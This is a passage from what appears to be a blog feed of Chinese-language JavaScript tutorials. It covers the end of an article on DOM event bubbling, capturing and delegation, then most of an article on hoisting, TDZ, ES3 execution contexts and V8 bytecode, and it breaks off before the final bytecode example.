但我們剛剛已經知道，任何點擊 li 的事件其實都會傳到 ul 身上，因此我們可以在 ul 身上掛一個 listener 就好。
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;  &lt;ul id=&quot;list&quot;&gt;    &lt;li data-index=&quot;1&quot;&gt;1&lt;/li&gt;    &lt;li data-index=&quot;2&quot;&gt;2&lt;/li&gt;    &lt;li data-index=&quot;3&quot;&gt;3&lt;/li&gt;  &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;

document.getElementById(&#x27;list&#x27;).addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(e.target.getAttribute(&#x27;data-index&#x27;));&#125;)

而這樣的好處是當你新增或是刪除一個 li 的時候，不用去處理跟那個元素相關的 listener，因為你的 listener 是放在 ul 身上。這樣透過父節點來處理子節點的事件，就叫做事件代理。
除此之外，我有想到幾個滿有趣的應用，大家可以參考看看。
例如說剛剛提到的e.preventDefault()，既然我們知道原理跟使用技巧，就可以這樣用：
window.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  e.preventDefault();  e.stopPropagation();&#125;, true);

只要這樣一段程式碼，就可以把頁面上所有的元素停用，點了都沒有反應，像是&lt;a&gt;點了不會跳出超連結，&lt;form&gt;按了submit也沒用，而且因為阻止事件冒泡，所以其他的onClick事件也都不會執行。
或是，也可以這樣用：
window.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(e.target);&#125;, true)

利用事件傳遞機制的特性，在window上面使用捕獲，就能保證一定是第一個被執行的事件，你就可以在這個 function 裡面偵測頁面中每一個元素的點擊，可以傳回去做數據統計及分析。
結論DOM 的事件傳遞機制算是 JavaScript 眾多經典面試題裡面相對簡單很多的，只要能掌握事件傳遞的原則跟順序，其實就差不多了。
而e.preventDefault與e.stopPropagation的差別在知道事件傳遞順序之後也大概能理解，前者就只是取消預設行為，跟事件傳遞沒有任何關係，後者則是讓事件不再往下傳遞。
希望這篇能讓大家理解 DOM 的事件傳遞機制，如果有哪邊有講錯，也麻煩大家不吝指證，感謝。
參考資料（比較推薦後面那些原文資料）：

JavaScript 详说事件机制之冒泡、捕获、传播、委托
Javascript 事件冒泡和捕获的一些探讨
浅谈 javascript 事件取消和阻止冒泡
What Is Event Bubbling in JavaScript? Event Propagation Explained
What is event bubbling and capturing?
Event order
Document Object Model Events

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>DOM</tag>
        <tag>event</tag>
        <tag>bubble</tag>
        <tag>capture</tag>
        <tag>propagation</tag>
      </tags>
  </entry>
  <entry>
    <title>我知道你懂 hoisting，可是你了解到多深？</title>
    <url>/2018/11/10/javascript-hoisting/</url>
    <content><![CDATA[前言這陣子我在忙一些教學相關的東西，稍微準備一些資料之後教了學生們 JavaScript 裡面的 hoisting，也就是「提升」這個觀念，例如說以下程式碼：
console.log(a)var a = 10

會輸出undefined而不是ReferenceError: a is not defined，這種現象就叫做 Hoisting，變數的宣告被「提升」到最上面去了。
如果你只想了解最基本的 hoisting，其實差不多就是這樣，但後來我還教了let跟const相關的一些知識，不過前一天剛教學完，隔天就立刻看到相關的技術文章還發現自己教錯，因此特別花了一點時間打算好好理解 hoisting 這個東西。
很多東西沒有深入研究的時候你都會覺得沒什麼，真的跳下去深入去看才會發現自己其實還有一大堆概念沒有搞懂。
有很多人都知道 hoisting，但是理解程度卻不盡相同，我列出了 10 個項目，如果有任何一點你剛好不知道的話，那恭喜，這篇文章應該可以為你帶來一些收穫。

你知道什麼是 hoisting
你知道 hoisting 只會提升宣告而非賦值
你知道 function 宣告、function 的參數以及一般變數宣告同時出現時的提升優先順序
你知道 let 跟 const 沒有 hoisting
你知道第四點是錯的，其實有但只是表現形式不一樣
你知道有關第五點，有個概念叫做 TDZ（Temporal Dead Zone）
你看過 ES3 的規格書，知道裡面是怎麼描述的
你看過 ES6 的規格書，知道裡面是怎麼描述的
你知道 hoisting 背後的原理是什麼
你看過 V8 編譯出來的程式碼

你可能會問說：「我為什麼要知道的這麼深？有什麼用？」，其實我也覺得對 hoisting，只要知道基本的就行了。只要你有好好地宣告變數，就算不知道那些，對日常生活或是工作也不會有太大的影響。
可是假如你像我一樣，想要有朝一日在自己的履歷上面放上「精通 JavaScript」的話，那對這些東西就不能逃避。同時你如果對底層的這些細節愈熟悉，會碰到的問題就愈少，也愈能理解為什麼會有 hoisting 的出現，當你想要在技術這條路上走得更遠爬得更高時，我覺得這些細節是很重要的。
接下來，我們就一步步來看 hoisting 吧！
什麼是 hoisting？在 JavaScript 裡面，如果你試圖去對一個還沒宣告的變數取值，會發生以下錯誤：
console.log(a)// ReferenceError: a is not defined

會回傳一個a is not defined的錯誤，因為你還沒宣告這個變數，所以 JavaScript 也找不到這變數在哪，自然就會拋出錯誤。
可是如果你這樣子寫，神奇的事情發生了：
console.log(a) // undefinedvar a

從以前學程式的時候我們就學到了一個觀念，「程式是一行一行跑的」，那既然是一行一行跑的，執行到第一行的時候不是還沒有宣告變數 a 嗎？那為什麼不是拋出a is not defined的錯誤，而是輸出了undefined？
這種現象就叫做 hoisting，提升，在第二行的var a因為某種原因被「提升」到了最上面，所以上面的程式碼你可以「想像」成這樣：
var aconsole.log(a) // undefined

我會特別強調「想像」，是因為程式碼的位置其實不會被移動，所以不要把提升想成是 JavaScript 引擎幫你把變數宣告都「移動」到最上面，這是有問題的。它背後的原理跟移動程式碼一點關係都沒有。
再來還有一點要特別注意，那就是只有變數的宣告會提升，賦值不會，看看以下範例你就懂了：
console.log(a) // undefinedvar a = 5

上面的程式碼你可以「想像」成這樣：
var aconsole.log(a) // undefineda = 5

你可以把var a = 5這句話分成兩個步驟，第一個階段是宣告變數：var a，第二個階段是賦值：a = 5，只有前面的變數宣告會被提升，賦值不會。
到這邊你可能覺得還行，只是頭腦有一點點混亂，那恭喜你，等一下還有更多東西會讓你更亂，讓我們再把幾個東西加進來，看看能夠搞得多複雜。
如果我們像下面這樣做，會輸出什麼？
function test(v)&#123;  console.log(v)  var v = 3&#125;test(10)

簡單嘛，根據剛剛學過的，把上面的程式碼變換成以下形式：
function test(v)&#123;  var v  console.log(v)  v = 3&#125;test(10)

答案是undefined！輕輕鬆鬆。
可是瑞凡，答案是10而不是undefined。
其實變換的過程對了，只是遺漏了一個因素：傳進來的參數。把這個因素加進去以後，可以看成是這樣：
function test(v)&#123;  var v = 10 // 因為下面呼叫 test(10)  var v  console.log(v)  v = 3&#125;test(10)

這時候你可能還是會問：「可是我在 log 以前不是重新宣告了一次變數並且沒有給值嗎？那它不是會被覆蓋成undefiend嗎？」
我們再來看一個簡單的小例子：
var v = 5var vconsole.log(v)

答案會是5而不是undefined，想理解這個行為，你可以再回想一下前面把一個句子分成兩塊，宣告跟賦值，如果我們這樣切分再加上 hoisting 的話，其實上面程式碼可以想像成這樣：
var vvar vv = 5console.log(v)

這樣你就知道為什麼答案是 5 了。
此時的你應該覺得頭腦有點快爆炸了，為什麼這麼多規則要記？別擔心，我們還有最後一個例子，保證讓你叫苦連天。
console.log(a) //[Function: a]var afunction a()&#123;&#125;

除了變數宣告以外，function 的宣告也會提升而且優先權比較高，因此上面的程式碼會輸出function而不是undefined。
好，基本的 hoisting 概念就到這邊結束了，幫你畫一下重點：

變數宣告跟函式宣告都會提升
只有宣告會提升，賦值不會提升
別忘了函式裡面還有傳進來的參數

別急，還有 ES6 新增的 let 跟 const 沒有講。
let 跟 const 與 hoisting在 ES6 裡面我們有了新的兩個宣告變數的關鍵字，let 與 const，這兩個對 hoisting 的行為是差不多的，因此我下面只拿 let 來舉例，可以看一下以下程式碼：
console.log(a) // ReferenceError: a is not definedlet a

謝天謝地，終於沒有那麼多規則要記了！
從以上程式碼看起來，let 與 const 應該是沒有變數提升吧，否則就不會拋出這個 Error 了。
我之前也是很天真這樣想的，直到我看到以下範例：
var a = 10function test()&#123;  console.log(a)  let a&#125;test()

如果 let 真的沒有 hoisting 的話，答案應該會輸出10，因為 log 那一行會存取到外面的var a = 10的這個變數，可是！！！
答案卻是：ReferenceError: a is not defined。
意思就是，它的確提升了，只是提升後的行為跟 var 比較不一樣，所以乍看之下你會以為它沒有提升。
這個觀念我們會在之後詳細講解，但在這之前我們先做個簡單的總結。
有很多提到 hoisting 的文章，講到這邊就差不多了，就大概講一些 hoisting 的行為以及 let 與 const 的不同之處，但我覺得只講到這裡其實是很可惜的一件事情。
因為如果你只理解到這個程度，就會以為 hoisting 不過就是一大堆複雜的規則要記，根本沒什麼，誰能夠記這麼多規則？不就是背書而已嗎？
這是因為上面那些只讓你理解了「表面」，舉出幾個不同的例子跟你說會有這樣的行為發生，可是卻沒有跟你說「為什麼會這樣」，或者是「實際上是怎麼運作的」，若是你想真正了解 hoisting 是什麼，必須要找出以下兩個問題的答案，一但找出了，保證你任督二脈直接被打通：

為什麼我們需要 hoisting？
Hoisting 到底是怎麼運作的？

為什麼我們需要 hoisting？在問這樣的一個問題時，其實你可以反過來想：「如果我們沒有 hoisting 會怎樣？」
第一，我們一定要先宣告變數才可以使用。
這點其實很不錯，畢竟這是一個好習慣。
第二，我們一定要先宣告函式才可以使用。
這一點就不太好了，很不方便，如果是這樣的話那可能在每個檔案你都必須把 function 宣告放到最上面去，才能保證你底下的程式碼都可以 call 到這些 function。
第三，沒有辦法達成 function 互相呼叫。
舉個例子：
function loop(n)&#123;  if (n&gt;1) &#123;    logEvenOrOdd(--n)  &#125;&#125;  function logEvenOrOdd(n) &#123;  console.log(n, n % 2 ? &#x27;Odd&#x27; : &#x27;Even&#x27;)  loop(n)&#125;  loop(10)

我們在loop裡面呼叫logEvenOrOdd，在logEvenOrOdd裡面也呼叫loop，如果我們沒有 hoisting，那以上的程式碼就不可能達成，因為你不可能同時做到 A 在 B 上面而 B 又在 A 上面。
所以為什麼我們需要 hoisting？就是為了要解決上面的問題。
為了增添這一個說法的正確性，我引用一篇文章給大家看，在 Note 4. Two words about “hoisting”. 裡面有提到作者發了個 Twitter 問說 hoisting 的目的到底是什麼，然後 JavaScript 的作者有出來回應，以下是文章裡面附的原文跟回應：

By the way, recently I raised this topic on Twitter and also mentioned as one of the reasons the mutual recursion. Brendan Eich also gave an acknowledgment that FDs hoisting is “for mutual recursion &amp; generally to avoid painful bottom-up ML-like order”.

如果想看完整對話截圖，可以看這篇文章：JavaScript系列文章：变量提升和函数提升，最下面有附。
hoisting 到底是怎麼運作的？現在我們知道了什麼是 hoisting，知道了為什麼需要 hoisting，接著就是欠缺的最後一塊拼圖了：到底 hoisting 是怎麼運作的？
要回答這個問題，最好的方法就是去找 ECMAScript 的規格書來看，就像你今天想研究型別轉換的問題，解法一樣是去找規格書來看，理由很簡單，因為那些規則都清清楚楚寫在上面了。
ECMAScript 有很多版本，越後面的版本規格越多，所以為了方便起見，我們底下用 ES3 當作範例。
如果你看過 ES3 的規則，會發現用 hoisting 當關鍵字完全找不到東西，而與 hoisting 這現象有關的段落其實在第十章：Execution Contexts。
這邊先非常簡單介紹一下什麼是 Execution Contexts（以下簡稱 EC），每當你進入一個 function 的時候，就會產生一個 EC，裡面儲存跟這個 function 有關的一些資訊，並且把這個 EC 放到 stack 裡面，當 function 執行完以後，就會把 EC 給 pop 出來。
示意圖大概就像這樣，要記得除了 function 有 EC 以外，還有一個 global EC：
（來源：https://medium.freecodecamp.org/lets-learn-javascript-closures-66feb44f6a44）
簡而言之呢，所有 function 需要的資訊都會存在 EC，也就是執行環境裡面，你要什麼都去那邊拿就對了。
ECMAScript 是這樣描述的：

When control is transferred to ECMAScript executable code, control is entering an execution context. Active execution contexts logically form a stack. The top execution context on this logical stack is the running execution context.

再來就是重點了，在10.1.3 Variable Instantiation的地方是這樣寫的：

Every execution context has associated with it a variable object. Variables and functions declared in the source text are added as properties of the variable object. For function code, parameters are added as properties of the variable object.

每個 EC 都會有相對應的 variable object（以下簡稱 VO），在裡面宣告的變數跟函式都會被加進 VO 裡面，如果是 function，那參數也會被加到 VO 裡。
首先，你可以把 VO 想像成就是一個 JavaScript 的物件就好。
再來，VO 什麼時候會用到？你在存取值的時候會用到，例如說 var a = 10 這一句，之前有講過可以分成左右兩塊：

var a：去 VO 裡面新增一個屬性叫做 a（如果沒有 a 這個屬性的話）並初始化成 undefined
a = 10：先在 VO 裡面找到叫做 a 的屬性，找到之後設定為 10

（這邊如果 VO 裡面找不到怎麼辦？它會透過 scope chain 不斷往上尋找，如果每一層都找不到就會拋出錯誤。至於尋找跟建立 scope chain 的過程雖然與本文有關但可以講得太多了，額外再開一篇會比較適合，這邊就先不提了）
接著來看下一段：

Which object is used as the variable object and what attributes are used for the properties depends on the type of code, but the remainder of the behaviour is generic. On entering an execution context, the properties are bound to the variable object in the following order:

最精華的只有這一句：「On entering an execution context, the properties are bound to the variable object in the following order」，在進入 EC 的時候，會按照以下順序把東西放到 VO 裡面：
下面的段落有點長，我節錄一下：

For function code: for each formal parameter, as defined in the FormalParameterList, create a property of the variable object whose name is the Identifier and whose attributes are determined by the type of code. The values of the parameters are supplied by the caller as arguments to [[Call]].
If the caller supplies fewer parameter values than there are formal parameters, the extra formal parameters have value undefined

簡單來說就是對於參數，它會直接被放到 VO 裡面去，如果有些參數沒有值的話，那它的值會被初始化成 undefined。
舉例來說，假設我 function 長這樣：
function test(a, b, c) &#123;&#125;test(10)

那我的 VO 就長這樣：
&#123;  a: 10,  b: undefined,  c: undefined&#125;

所以參數是第一個優先順序，再來我們看第二個：

For each FunctionDeclaration in the code, in source text order, create a property of the variable object whose name is the Identifier in the FunctionDeclaration, whose value is the result returned by creating a Function object as described in 13, and whose attributes are determined by the type of code. 
If the variable object already has a property with this name, replace its value and attributes. Semantically, this step must follow the creation of FormalParameterList properties.

對於 function 的宣告，一樣在 VO 裡面新增一個屬性，至於值的話就是建立 function 完之後回傳的東西（可以想成就是一個指向 function 的指標就好）。
再來是重點：「如果 VO 裡面已經有同名的屬性，就把它覆蓋掉」，舉個小例子：
function test(a)&#123;  function a()&#123;&#125;&#125;test(1)

VO 會長的像這樣，原本的參數a被覆蓋掉了：
&#123;  a: function a&#125;

最後來看對於變數的宣告該怎麼處理：

For each VariableDeclaration or VariableDeclarationNoIn in the code, create a property of the variable object whose name is the Identifier in the VariableDeclaration or VariableDeclarationNoIn, whose value is undefined and whose attributes are determined by the type of code. If there is already a property of the variable object with the name of a declared variable, the value of the property and its attributes are not changed. 
Semantically, this step must follow the creation of the FormalParameterList and FunctionDeclaration properties. In particular, if a declared variable has the same name as a declared function or formal parameter, the variable declaration does not disturb the existing property.

對於變數，在 VO 裡面新增一個屬性並且把值設為 undefined，再來是重點：「如果 VO 已經有這個屬性的話，值不會被改變」
來重新整理一下，當我們在進入一個 EC 的時候（你可以把它想成就是在執行 function 後，但還沒開始跑 function 內部的程式碼以前），會按照順序做以下三件事：

把參數放到 VO 裡面並設定好值，傳什麼進來就是什麼，沒有值的設成 undefined
把 function 宣告放到 VO 裡，如果已經有同名的就覆蓋掉
把變數宣告放到 VO 裡，如果已經有同名的則忽略

在你看完規格並且稍微理解以後，你就可以用這個理論來解釋我們前面看過的程式碼了：
function test(v)&#123;  console.log(v)  var v = 3&#125;test(10)

每個 function 你都可以想成其實執行有兩個階段，第一個階段是進入 EC，第二個階段才是真的一行行執行程式。
在進入 EC 的時候開始建立 VO，因為有傳參數進去，所以先把 v 放到 VO 並且值設定為 10，再來對於裡面的變數宣告，VO 裡面已經有 v 這個屬性了，所以忽略不管，因此 VO 就長這樣子：
&#123;  v: 10&#125;

進入 EC 接著建立完 VO 以後，才開始一行行執行，這也是為什麼你在第二行時會印出 10 的緣故，因為在那個時間點 VO 裡面的 v 的確就是 10 沒錯。
如果你把程式碼換成這樣：
function test(v)&#123;  console.log(v)  var v = 3  console.log(v)&#125;test(10)

那第二個印出的 log 就會是 3，因為執行完第三行以後， VO 裡面的值被換成 3 了。
以上就是 ES3 的規格書裡面提到的執行流程，你只要記得這個執行流程，碰到任何關於 hoisting 的題目都不用怕，你按照規格書的方法去跑絕對沒錯。
當我知道了這一段執行流程以後，第一個感想是豁然開朗，覺得 hoisting 不再是什麼神秘的東西，你只要假裝自己是 JS 引擎，跟著跑就好。第二個感想是，JS 到底怎麼做到的？
編譯與直譯：JS 引擎到底怎麼運作的？還記得我上面的時候有提過，以前學程式的時候一直有個概念，那就是「直譯」代表程式是一行行跑的，而 JS 作為一個直譯的語言，不是也該一行行跑嗎？
可是如果真的一行行跑，那怎麼可能達成 hoisting 這個功能？你在執行第 n 行的時候根本不知道 n + 1 行是什麼，想提升是不可能的。
針對這個疑惑我上網找了很久的資料，最後找到一篇的說法我覺得滿合理的：虚拟机随谈（一）：解释器，树遍历解释器，基于栈与基于寄存器，大杂烩。
裡面提到了幾點我覺得寫得非常不錯，有破除了我滿多以前的迷思：
第一，語言一般只會定義抽象語義，不會強制用某種方式實現，像是 C 我們會說它是編譯型語言，可是 C 也有直譯器。所以當我們在說某種程式語言是直譯或編譯型的時候，其實是在指涉「大多數」而不是全部。
換言之，我們說 JavaScript 是直譯型語言，不代表 JavaScript 不能有編譯器，反之亦然。
第二，直譯器跟編譯器最大的差別在於「執行」。
編譯這個步驟就是把原始碼 A 編譯為目的碼 B，就這樣而已，但你要保證 A 跟 B 執行完的結果要相同。
而直譯就是你輸入原始碼 A，輸出就直接是你程式碼裡面要執行的語義，裡面怎麼做的是一個黑箱子。
原文裡面有一張圖畫得很不錯：

所以直譯器裡面也能有編譯，這是不衝突的，或是你也可以寫一個超簡單直譯器，就是你輸入原始碼以後幫你編譯完然後執行。
事實上很多種直譯器內部的運作方式都是先把原始碼編譯成某種中間碼再去執行，所以編譯這個步驟還是很常見的，而 JS 也是這樣運作的。
當你拋開以前那種「JS 就是要一行行執行」的舊觀念並擁抱「其實主流 JS 引擎都有編譯這個步驟」的想法後，你就不會覺得 hoisting 是無法達成的事情了。
前面我們已經有看規格，知道在 ES3 裡面的運行模式並且知道 VO 這個東西，但規格裡面描述的也只是抽象的東西，它並沒有寫說「實際上」是在哪個地方做處理的，而這地方其實就是編譯階段。
話說關於這個編譯直譯的問題其實我卡滿久的，因為以前觀念不正確的地方很多，現在慢慢把它修正過來，而對於 hoisting 其實我之前有點分不清楚規格跟實作的差別，後來還跑去問了You-Dont-Know-JS 的作者，也很幸運地得到回覆，有興趣的人可以看看：https://github.com/getify/You-Dont-Know-JS/issues/1375。
JS 引擎的運作如同我上面所說的，其實現在主流 JS 引擎內部都會有編譯這個階段，而 hoisting 其實就是在編譯這個階段做處理的。引入了編譯階段以後，可以把 JS 分成編譯階段跟執行階段兩個步驟。
在編譯階段的時候，會處理好所有的變數及函式宣告並且加入到 scope 裡面，在執行的時候就一樣可以去使用它。詳細情形這一篇寫得很好：Hoisting in JavaScript
，我下面就直接改一下裡面的程式碼當做例子。
舉例來說，我有這樣一段程式碼：
var foo = &quot;bar&quot;var a = 1function bar() &#123;    foo = &quot;inside bar&quot;    var a = 2    c = 3    console.log(c)    console.log(d)&#125;bar()

在編譯階段的時候會處理宣告的部分，所以會是這樣：
Line 1：global scope，我要宣告一個變數叫做 fooLine 2：global scope，我要宣告一個變數叫做 aLine 3：global scope，我要宣告一個函式叫做 barLine 4：沒有任何變數宣告，不做事Line 5：bar scope，我要宣告一個變數叫做 aLine 6：沒有任何變數宣告，不做事Line 7：沒有任何變數宣告，不做事Line 8：沒有任何變數宣告，不做事

處理完後的東西差不多就長這樣：
globalScope: &#123;  foo: undefined,  a: undefined,  bar: function&#125;  barScope: &#123;  a: undefined&#125;

再來進入到執行階段，這邊有兩個專有名詞先記一下，在介紹之前我先給一個範例會比較好理解：
var a = 10console.log(a)

上面這兩行有個差異，第一行的時候我們只需要知道「a 的記憶體位置在哪裡」就好，我們不關心它的值是什麼。
而第二行則是「我們只關心它的值是什麼，把值給我就好」，所以儘管兩行裡面都有a，但你可以看出來他們所要做的事情是不一樣的。
而第一行的 a 我們叫它 LHS（Left hand side）引用，第二行叫它 RHS（Right hand side）引用，這邊的 left 跟 right 指的是相對於等號的左右邊，但用這種方式理解的話其實不夠精確，因此像下面這樣記就好：
LHS：請幫我去查這個變數的位置在哪裡，因為我要對它賦值。RHS：請幫我查詢這個變數的值是什麼，因為我要用這個值。
有了這個概念以後，再看一次上面的範例程式碼，就可以一步一步來解釋：
var foo = &quot;bar&quot;var a = 1function bar() &#123;    foo = &quot;inside bar&quot;    var a = 2    c = 3    console.log(c)    console.log(d)&#125;bar()

Line 1：var foo &#x3D; “bar”JS 引擎：global scope，我這裡有個對 foo 的 LHS 引用，你有看過它嗎？執行結果：scope 說有，所以成功找到 foo 並且賦值  
這時候的 global scope：
&#123;  foo: &quot;bar&quot;,  a: undefined,  bar: function&#125;

Line 2：var a &#x3D; 1JS 引擎：global scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？執行結果：scope 說有，所以成功找到 a 並且賦值
這時候的 global scope：
&#123;  foo: &quot;bar&quot;,  a: 1,  bar: function&#125;

Line 10：bar()JS 引擎：global scope，我這裡有個對 bar 的 RHS 引用，你有看過它嗎？執行結果：scope 說有，所以成功返回 bar 的值並且呼叫 function
Line 4：foo &#x3D; “inside bar”JS 引擎：bar scope，我這裡有個對 foo 的 LHS 引用，你有看過它嗎？執行結果：bar scope 說沒有，所以去問上一層的 global scopeJS 引擎：global scope，我這裡有個對 foo 的 LHS 引用，你有看過它嗎？執行結果：有，所以成功找到 foo 並且賦值
這時候的 global scope：
&#123;  foo: &quot;inside bar&quot;,  a: 1,  bar: function&#125;

Line 5：var a &#x3D; 2JS 引擎：bar scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？執行結果：bar scope 說有，所以成功找到 a 並且賦值
此時的 bar scope：
&#123;  a: 2&#125;

Line 6：c &#x3D; 3JS 引擎：bar scope，我這裡有個對 c 的 LHS 引用，你有看過它嗎？執行結果：bar scope 說沒有，所以去問上一層的 global scopeJS 引擎：global scope，我這裡有個對 c 的 LHS 引用，你有看過它嗎？執行結果：沒有。
這時候有幾種結果，如果你是處在嚴格模式底下（use strict），會返回 ReferenceError: c is not defined 錯誤，如果你不是在嚴格模式，那 global scope 就會把 c 加上去並且設定成 3，這邊先假設我們不是在嚴格模式。
此時的 global scope：
&#123;  foo: &quot;inside bar&quot;,  a: 1,  bar: function,  c: 3&#125;

Line 7：console.log(c)JS 引擎：bar scope，我這裡有個對 c 的 RHS 引用，你有看過它嗎？執行結果：bar scope 說沒有，所以去問上一層的 global scopeJS 引擎：global scope，我這裡有個對 c 的 RHS 引用，你有看過它嗎？執行結果：global scope 說有，所以成功返回 c 的值並且呼叫 console.log
Line 8：console.log(d)JS 引擎：bar scope，我這裡有個對 d 的 RHS 引用，你有看過它嗎？執行結果：bar scope 說沒有，所以去問上一層的 global scopeJS 引擎：global scope，我這裡有個對 d 的 RHS 引用，你有看過它嗎？執行結果：global scope 說沒有，所以返回錯誤 ReferenceError: d is not defined
以上就是 JS 引擎的運作流程，想更詳細了解的話可參考：You Don’t Know JS: Scope &amp; Closures、Chapter 4: Hoisting、Hoisting in JavaScript。
中場總結再次回顧一下我們開場放的那十個項目：

你知道什麼是 hoisting
你知道 hoisting 只會提升宣告而非賦值
你知道 function 宣告、function 的參數以及一般變數宣告同時出現時的提升優先順序
你知道 let 跟 const 沒有 hoisting
你知道第五點是錯的，其實有但只是表現形式不一樣
你知道有關第六點，有個概念叫做 TDZ（Temporal Dead Zone）
你看過 ES3 的規格書，知道裡面是怎麼描述的
你看過 ES6 的規格書，知道裡面是怎麼描述的
你知道 hoisting 背後的原理是什麼
你看過 V8 編譯出來的程式碼

我們用了許多篇幅把其中的七點都講完了，剩下的是：

你知道有關第六點，有個概念叫做 TDZ（Temporal Dead Zone）
你看過 ES6 的規格書，知道裡面是怎麼描述的
你看過 V8 編譯出來的程式碼

關於 ES6 的規格那點我不打算詳細講（而且我也還沒詳細看完），因為變化還滿多的但基本上原理不變，就是多了一些專有名詞而已，想知道的可以參考這篇經典好文：ECMA-262-5 in detail. Chapter 3.2. Lexical environments: ECMAScript implementation.。
上面我們已經講了很多東西，所有跟 hoisting 有關的運作機制全部都講完了，但我相信依然需要一點時間吸收，但我相信吸收完以後你會覺得神清氣爽，想說 hoisting 不過如此而已。
接著呢，我們就要進入到這篇文章最後的部分了，也就是 TDZ 以及 V8。
Temporal Dead Zone還記得我們說過 let 與 const 其實有 hoisting 嗎？並且舉了一個小範例來驗證這件事情。
let 與 const 確實有 hoisting，與 var 的差別在於提升之後，var 宣告的變數會被初始化為 undefined，而 let 與 const 的宣告不會被初始化為 undefined，而且如果你在「賦值之前」就存取它，就會拋出錯誤。
在「提升之後」以及「賦值之前」這段「期間」，如果你存取它就會拋出錯誤，而這段期間就稱做是 TDZ，它是一個為了解釋 let 與 const 的 hoisting 行為所提出的一個名詞。
我們用下面的程式碼當做例子：
function test() &#123;    var a = 1; // c 的 TDZ 開始    var b = 2;    console.log(c) // 錯誤    if (a &gt; 1) &#123;      console.log(a)    &#125;    let c = 10 // c 的 TDZ 結束&#125;test()

當你在第八行執行以前試圖存取 c 的話，就會拋出錯誤。要注意的是 TDZ 並不是一個空間上的概念，而是時間，例如說以下程式碼：
function test() &#123;    yo() // c 的 TDZ 開始    let c = 10 // c 的 TDZ 結束    function yo()&#123;      console.log(c)    &#125;&#125;test()

在你進入 test 這個 function 的時候，就已經是 c 的 TDZ 了，所以當你執行 yo 並且執行到console.log(c)時，都還在 TDZ 裡面，要一直等到let c = 10被執行 TDZ 才會結束。
所以並不是說我把console.log(c)放在let c = 10下面就沒問題了，而是在「執行順序」上要在後面。
或是你也可以拋開這些名詞，用一句話總結：

let 與 const 也有 hoisting 但沒有初始化為 undefined，而且在賦值之前試圖取值會發生錯誤。

Byte code 閱讀初體驗上面既然談到了 JS 引擎，如果沒有談到 V8 那就有點可惜，在我研究 hoisting 的時候我一直很想知道一件事情：V8 編譯出來的程式碼到底長怎樣？
感謝 Understanding V8’s Bytecode 這一篇精彩的文章，可以讓我們試著用 node.js 把程式碼編譯成 byte code 並且試圖解讀。
在看之前先來介紹什麼是 byte code，它就是一種介於高階語言與機器碼中間的語言，沒有高階語言好懂可是卻比機器碼好懂許多，而執行起來的效率也比較高。
下面這張圖就是文章裡面附的，很清楚地解釋了之間的關係：

接著我們用這一個簡單的 function 當作範例，來看編譯過後會長怎樣：
function funcA() &#123;    var a = 10    console.log(a)&#125;funcA()

雖然只有一個 function，但是用 node.js 跑還是會出現一大堆東西，所以我們把結果先放到檔案裡面：node --print-bytecode test.js &gt; byte_code.txt
編譯出來的結果長這樣：
[generating bytecode for function: funcA]Parameter count 1Frame size 24   76 E&gt; 0xeefa4feb062 @    0 : 91                StackCheck    93 S&gt; 0xeefa4feb063 @    1 : 03 0a             LdaSmi [10]         0xeefa4feb065 @    3 : 1e fb             Star r0  100 S&gt; 0xeefa4feb067 @    5 : 0a 00 02          LdaGlobal [0], [2]         0xeefa4feb06a @    8 : 1e f9             Star r2  108 E&gt; 0xeefa4feb06c @   10 : 20 f9 01 04       LdaNamedProperty r2, [1], [4]         0xeefa4feb070 @   14 : 1e fa             Star r1  108 E&gt; 0xeefa4feb072 @   16 : 4c fa f9 fb 00    CallProperty1 r1, r2, r0, [0]         0xeefa4feb077 @   21 : 04                LdaUndefined   115 S&gt; 0xeefa4feb078 @   22 : 95                Return Constant pool (size = 2)Handler Table (size = 16)

我們把前面一些資訊清空並加上註解，好讓大家知道上面程式碼是什麼意思（我其實也沒有真的很懂，這方面資料好像滿少的，如果有錯請糾正）：
StackCheck LdaSmi [10]                    // 把 10 放到 accumulator 裡面Star r0                        // 把 accumulator 的值放到 r0 裡，所以 r0 = 10LdaGlobal [0], [2]             // 載入一個 Global 的東西到 acc 裡Star r2                        // 把它存到 r2，根據後見之明，r2 應該就是 consoleLdaNamedProperty r2, [1], [4]  // 載入一個 r2 的 Property（應該就是 log）Star r1                        // 把它存到 r1，也就是 r1 = console.logCallProperty1 r1, r2, r0, [0]  // console.log.call(console, 10)LdaUndefined                   // 把 undefined 放到 accReturn                         // return undefined

再來我們把順序顛倒，變成這樣：
function funcA() &#123;    console.log(a)    var a = 10&#125;funcA()

來看看輸出的 byte code 會變什麼樣子，看解釋之前你可以先對照一下上面的，看看差別在哪：
StackCheckLdaGlobal [0], [2]             // 載入一個 Global 的東西到 acc 裡Star r2                        // 把它存到 r2，根據後見之明，r2 應該就是 consoleLdaNamedProperty r2, [1], [4]  // 載入一個 r2 的 Property（應該就是 log）Star r1                        // 把它存到 r1，也就是 r1 = console.logCallProperty1 r1, r2, r0, [0]  // console.log.call(console, undefined)LdaSmi [10]                    // 把 10 放到 accumulator 裡面Star r0                        // 把 accumulator 的值放到 r0 裡，所以 r0 = 10LdaUndefined                   // 把 undefined 放到 accReturn                         // return undefined 

其實只是順序調換了一下，在輸出的地方直接 log 了 r0，這邊我不確定的是 r0 原本就是 undefined，還是在其他地方被初始化成 undefined。
再來我們看看如果試圖印出一個未宣告的變數會發生什麼事：
function funcA() &#123;    console.log(b)    var a = 10&#125;funcA()

因為大部分程式碼都跟前面重複我就不再註解了：
StackCheck LdaGlobal [0], [2]Star r2LdaNamedProperty r2, [1], [4]Star r1LdaGlobal [2], [6]  // 試圖載入 b 的值，出錯Star r3CallProperty1 r1, r2, r3, [0]LdaSmi [10]Star r0LdaUndefined Return     

整段的重點只有LdaGlobal那行，看起來應該是去載入 b 的值，在執行的時候應該也就是這行出錯，因為在 global 裡面找不到 b。
看完了基本的之後，我們來看看 let 會編譯成什麼樣子：
function funcA() &#123;    console.log(a)    let a = 10&#125;funcA()

編譯後的結果：
